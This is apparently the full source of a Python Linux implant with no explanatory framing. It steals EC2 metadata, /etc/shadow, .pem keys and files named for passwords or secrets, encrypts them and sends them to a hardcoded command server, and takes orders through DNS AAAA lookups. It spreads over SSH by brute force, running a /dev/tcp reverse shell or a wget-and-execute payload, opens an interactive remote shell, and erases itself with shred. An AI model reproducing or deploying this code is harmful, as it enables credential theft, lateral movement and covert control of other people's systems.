from cryptography.fernet import Fernet, MultiFernet
import socket
import subprocess
import os
import paramiko
import getpass
import httplib
import urllib2
import scapy
import struct
from scapy.all import *

bep = "www"
breg = ""

stcd = ["fe23","39ff","80e3","fe2e","2bc1","0e9f","d109","a066","e40f"]

lhst = "10.0.65.122"
adar = []

ri = os.popen('netstat -r | grep default').read()
rs = ri.split(" ")
rh = rs[-1].rstrip()
xs = os.popen('ifconfig ' + rh + ' | grep inet').read()
xv = xs.split(' ')
xd = xv.index('inet')
xi = xd	+ 1
xs = xv[xi]
if 'addr:' in xs:
	xn = xs[5:]
else:
	xn = xs
fhost = xn
xa = str(xn).split('.')
xt = (xa[0] + '.' + xa[1] + '.' + xa[2] + '.')
xl = (int(xa[3]) - 10)
xu = (int(xa[3]) + 10)
for cin in range(xl,xu):
	vx = xt + str(cin)
	adar.append(vx)	

def wissenschaft(data,flg):
	x = Fernet("Ifk3ny_HBGoAKI9RG5wgLH65pulR7JlU5optDSJqDPI=")
	ra = x.decrypt("gAAAAABZ5zUw42tpOqjESN6Ec9tMpYaEOi23G4kVV9jq7JHGtPd8unj2K2tIb4Ub95nyowCa42PI4Oo2tZ5H8wRY_f8qC-u3FlX0XYLn5FaZWvY7P8XI6J4DC2irfWt81Bp1cO-6EsU2")
	f = Fernet(ra)	

	if flg == 0:
		encfil = f.encrypt(data)
            	return encfil
	elif flg == 1:
		try:
			defil = f.decrypt(data)
			return defil
		except:
			print data
	else:
		return

def kriegspiel():
	try:
		rem = []
		ec = open('/sys/hypervisor/uuid','r')
		ef = ec.read()
		ec.close()
		if "ec2" in ef:
			ecm = urllib2.urlopen("http://169.254.169.254/latest/meta-data").read()
			mcs = ecm.split("\n")
			for i in mcs:
				mi = ("http://169.254.169.254/latest/meta-data/" + i)
				rim = urllib2.urlopen(mi).read()
				rem += (i + "::" + rim)
			mer = "%".join(rem)
			sonne(wissenschaft(mer,0))
		else:
			return
	except:
		pass

def jagdzeit():
	kriegspiel()
	s = os.popen('netstat -r')
	sten = s.read()

	gnip = ""
	
	for pn in adar:
		gn = os.system('ping -c 2 %s' % pn)
		if gn == 0:
			gnip += ("\\" + pn)
		else:
			continue
	sonne(wissenschaft(sten,0))
	sonne(wissenschaft(gnip,0))

	return "yvfgra"


def schadenfreude(rhost): 
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	print rhost
	prs = s.connect_ex((rhost,22))
	s.close()
	if prs:
		return
	else:
		sox = (rhost + ":22")
		sonne(wissenschaft(sox,0))

def vulfen():
	ep = open('/etc/passwd','r')
	ulist = ep.read()
	ep.close()
	try:
		es = open('/etc/shadow','r')
		plist = es.read()
		es.close()
		return "yvfgra"
	except:
		return "rkprcg"
		pass
	
	sonne(wissenschaft(plist,0))


def flammenwerfer():
	try:
		pk = []
		for root, dirs, files in os.walk('/home'):
			for fi in files:
				if fi.endswith('.pem'):
					pk.append(os.path.join(root,fi))
		ks = "".join(pk)
		sonne(wissenschaft(ks,0))
		return "yvfgra"
	except:
		return "rkprcg"
		pass

	

def himmelsturmer(rhost,keys,pwrd,kv,musr,usf,pld):

	#incomplete
	if musr == '0':
		susr = getpass.getuser()
	elif musr == '1':
		susr = usf

	bpath = '/usr/local/bin/.netmgr/netmgr.exe'
	if pld == '0':
		rvsh = ('bash -i >& /dev/tcp/' + lhst + '/55601 0>&1')
	elif pld == '1':
		rvsh = ('wget -quiet http://' + lhst + ':8443/PbeIvQnR ' + bpath + '; ' + bpath)
	else:
		rvsh = ('bash -i >& /dev/tcp/' + lhst + '/55601 0>&1')

	if kv == '1':
		for kx in keys:
			try:
				s = paramiko.SSHClient()
				s.load_system_host_keys()
				s.set_missing_host_key_policy(paramiko.AutoAddPolicy())
				s.connect(rhost,22,susr,kx)
				stdin,stdout,stderr = s.exec_command(rvsh)
				s.close()
				return "rvshll"
			except:
				continue
	elif kv == '0':
		for px in pwrd:
			try:
				s = paramiko.SSHClient()
				s.load_system_host_keys()
				s.set_missing_host_key_policy(paramiko.AutoAddPolicy())
				s.connect(rhost,22,susr,px)
				stdin,stdout,stderr = s.exec_command(rvsh)
				s.close()
				return "rvshll"
			except:
				continue
		
	
def panzermensch():
	rslt = []
	tx = []
	fnm = ['password','password.txt','password.csv','secret','secret.txt','secret.csv','keys','keys.txt','keys.csv','users','users.txt','users.csv','creds','creds.txt','creds.csv','private','private.txt','private.csv']
	for root, dirs, files in os.walk('/home'):
		for fi in files:
			for name in fnm:
				if name in fi:
					rslt.append(os.path.join(root,fi))
	
	for dmp in rslt:
		tr = open(dmp,'rb')
		td = tr.read()
		tx.append(td)

	te = "".join(tx)
	tm = wissenschaft(te,0)
	sonne(tm)
	return "yvfgra"

def sturm(sk,ms):
	msg = struct.pack('>I', len(ms)) + ms
	sk.sendall(msg)

def kugelblitz():
	port = 55605
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((lhst,port))
	while 1:
		atad = s.recv(16384)
		data = wissenschaft(atad,1)
		if data == "quit" or data == "exit": break
		proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		stdout_value = proc.stdout.read() + proc.stderr.read()
		sturm(s,wissenschaft(stdout_value,0))
	s.close()
	time.sleep(45)
	zeitgeist("yvfgra")

def aufwiedersehen():
	for root, dirs, files in os.walk('/'):
		for fi in files:
			if fi.startswith('wendigo'):
				rt = os.path.join(root,fi)
				rr = root
	rs = os.path.join(rr,'uninst.sh')
	rf = open(rs,'w+')
	rf.write('shred ' + rt + '; rm ' + rt)
	rf.close()
	os.popen('at -f ' + rs + ' now + 30 min')

def zinnsoldat(cretr):
	print cretr

	if "fe23" in cretr:
		res = flammenwerfer()
		time.sleep(150)
		zeitgeist(res)
        elif "39ff" in cretr: 
		res = []
		nap = panzermensch()
		luv = vulfen()
		res.append(nap)
		res.append(luv)
		if "rkprcg" in res:
			ret = "rkprcg"
		else:
			ret = "yvfgra"
		time.sleep(150)
		zeitgeist(ret)
	elif "80e3" in cretr: 
		obeg = urllib2.urlopen("http://" + lhst + ":8443/gebo").readlines()
		for line in obeg:
			rh = line.rstrip()
			eni = wissenschaft(rh,1)
			schadenfreude(eni)
		time.sleep(45)
		zeitgeist("yvfgra")
        elif "fe2e" in cretr:
		kys = []
		pwrd = []
		lni = []
	      	lr = wissenschaft(urllib2.urlopen("http://" + lhst + ":8443/trShruFZe").read(),1)
		lni = lr.split('%')
		rhst = lni[0]
		kys.append(lni[1])
		kys.append(lni[2])
		kys.append(lni[3])
		pwrd.append(lni[4])
		pwrd.append(lni[5])
		pwrd.append(lni[6])
		kv = lni[7]
		msr = lni[8]
		sf = lni[9]
		pld = lni[10]
		himmelsturmer(rhst,kys,pwrd,kv,msr,sf,pld)
		time.sleep(900)
		zeitgeist("yvfgra")
        elif "2bc1" in cretr: 
		kugelblitz()
		time.sleep(90)
		zeitgeist("yvfgra")
	elif "0e9f" in cretr: 
		aufwiedersehen()
	elif "d109" in cretr:
		sys.exit()
	elif "a066" in cretr:
		time.sleep(900)
		zeitgeist("yvfgra")
	else:
		return

def vergissmeinnicht():

	flammenwerfer()
	vulfen()
	panzermensch()	
	aufwiedersehen()
	sys.exit()
	
def zeitgeist(bfil):
	dm = (bep + "." + breg + "." + bfil)
	nstr = ("nslookup -query=AAAA " + dm + " " + lhst)
	dk = os.popen(nstr).read()
	print dk
	ds = dk.split("\n")
	dl = len(ds) - 1
	for l in range(dl):
		if "AAAA" in ds[l]:
			da = ds[l].split("\t")[1]
	dr = da.replace("has AAAA address ","")
	dt = dr.split(":")[1]
	zinnsoldat(dt)

def abgrund():
	global breg
	gg = getpass.getuser()
	if "root" in gg:
		evt = '0'
	else:
		evt = '1'
	breg = ("wndg" + evt + xa[2] + xa[3])
	return breg	

def sonne(encfil):
	req = encfil
	headers = {"Content-Type": "text/html", "Accept-Encoding": "text/plain", "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) like Gecko","proxy-authorization": encfil}
	conn = httplib.HTTPConnection(lhst)
	conn.request("GET", " ", " ", headers)

if __name__ == "__main__":
	abgrund()
	jgd = jagdzeit()
	time.sleep(90)
	zeitgeist('wtmrvg')


